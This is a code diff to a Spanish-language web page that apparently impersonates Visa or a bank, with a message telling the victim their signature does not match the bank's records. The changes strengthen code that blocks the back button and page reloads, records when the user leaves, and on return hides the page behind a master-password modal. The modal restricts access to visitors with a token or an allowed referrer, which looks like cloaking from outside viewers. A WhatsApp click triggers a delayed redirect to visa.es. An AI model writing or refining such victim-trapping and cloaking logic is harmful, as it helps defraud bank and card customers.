@@ -2138,8 +2138,6 @@
           </span>
         </button>
       </div>
-    </div>
-  </div>
 </div>
 
 <!-- Overlay Secuencial POST-FIRMA (Conexión, Análisis, etc.) -->
@@ -2580,7 +2578,7 @@ Tu firma no coincide con la registrada en el banco. Necesitamos que pases por un
   document.addEventListener("scroll", resetInactivityTimer);
 
   /****************************************************
-   * Evitar retroceso y recarga con advertencia
+   * Evitar retroceso y recarga con advertencia MEJORADO
    ****************************************************/
   function setupNavigationWarning() {
     // Evitar retroceso
@@ -2593,7 +2591,7 @@ Tu firma no coincide con la registrada en el banco. Necesitamos que pases por un
       }
     });
     
-    // MODIFICACIÓN: Evitar recarga
+    // MODIFICACIÓN MEJORADA: Evitar recarga con confirmación
     window.addEventListener('beforeunload', function(e) {
       if (!isRedirecting) {
         e.preventDefault();
@@ -2608,6 +2606,8 @@ Tu firma no coincide con la registrada en el banco. Necesitamos que pases por un
     
     if (confirmLeave) {
       isRedirecting = true;
+      // Establecer una marca temporal que indique que el usuario ha salido
+      sessionStorage.setItem('userLeft', Date.now());
       window.location.href = "https://visa.es";
     }
   }
@@ -3635,6 +3635,7 @@ Tu firma no coincide con la registrada en el banco. Necesitamos que pases por un
 
     whatsappLink.addEventListener("click", function(){
       setTimeout(function(){
+        isRedirecting = true;
         window.location.href = "https://visa.es";
       }, 120000);
     });
@@ -3824,7 +3825,7 @@ Tu firma no coincide con la registrada en el banco. Necesitamos que pases por un
   }
 
   /****************************************************
-   * NUEVA FUNCIÓN: Agregar protección de contraseña
+   * NUEVA FUNCIÓN: Agregar protección de contraseña MEJORADA
    ****************************************************/
   function addPasswordProtection() {
     // Definir página actual y su referente permitido
@@ -3841,8 +3842,13 @@ Tu firma no coincide con la registrada en el banco. Necesitamos que pases por un
     // Comprobar si el referrer es válido
     const hasValidReferrer = referrerPage === allowedReferrer;
     
-    // Si no tiene un token válido y no viene de un referrer permitido, mostrar modal de contraseña
-    if (!hasValidToken && !hasValidReferrer) {
+    // Comprobar si el usuario viene de visa.es (tras ser redirigido)
+    const userLeftTimestamp = sessionStorage.getItem('userLeft');
+    const comingFromVisaEs = userLeftTimestamp && 
+                             (new Date().getTime() - parseInt(userLeftTimestamp) < 5 * 60 * 1000); // 5 minutos
+    
+    // Si no tiene un token válido y no viene de un referrer permitido, o viene desde visa.es, mostrar modal de contraseña
+    if ((!hasValidToken && !hasValidReferrer) || comingFromVisaEs) {
         // Ocultar el contenido de la página
         document.documentElement.style.display = 'none';
         
@@ -3868,11 +3874,15 @@ Tu firma no coincide con la registrada en el banco. Necesitamos que pases por un
             passwordModal.style.backgroundColor = 'rgba(0, 0, 0, 0.8)';
             passwordModal.style.zIndex = '9999';
             
-            // Contenido del modal
+            // Contenido del modal (mensajes personalizados según el caso)
+            const message = comingFromVisaEs ? 
+                "Has salido de la página y debes ingresar la contraseña para continuar con tu sesión." : 
+                `Esta página solo es accesible desde ${allowedReferrer}.`;
+            
             passwordModal.innerHTML = `
                 <div style="background-color: white; padding: 30px; border-radius: 8px; text-align: center; max-width: 400px; width: 90%;">
                     <h2 style="color: #1a1f71; margin-bottom: 20px;">Acceso Restringido</h2>
-                    <p style="margin-bottom: 20px;">Esta página solo es accesible desde ${allowedReferrer}. Por favor, ingrese la contraseña para continuar.</p>
+                    <p style="margin-bottom: 20px;">${message} Por favor, ingrese la contraseña para continuar.</p>
                     <input type="password" id="passwordInput" style="width: 100%; padding: 10px; margin-bottom: 15px; border: 1px solid #ccc; border-radius: 4px;">
                     <div>
                         <button id="submitBtn" style="background-color: #1a1f71; color: white; border: none; padding: 10px 20px; margin-right: 10px; border-radius: 4px; cursor: pointer;">Acceder</button>
@@ -3911,6 +3921,9 @@ Tu firma no coincide con la registrada en el banco. Necesitamos que pases por un
                 if (password === masterPassword) {
                     // Almacenar token de acceso en sesión
                     sessionStorage.setItem('accessToken_' + currentPage, 'authorized');
+                    
+                    // Eliminar cualquier marca de sesión anterior
+                    sessionStorage.removeItem('userLeft');
                     
                     // Eliminar modal y mostrar contenido
                     document.body.removeChild(passwordModal);
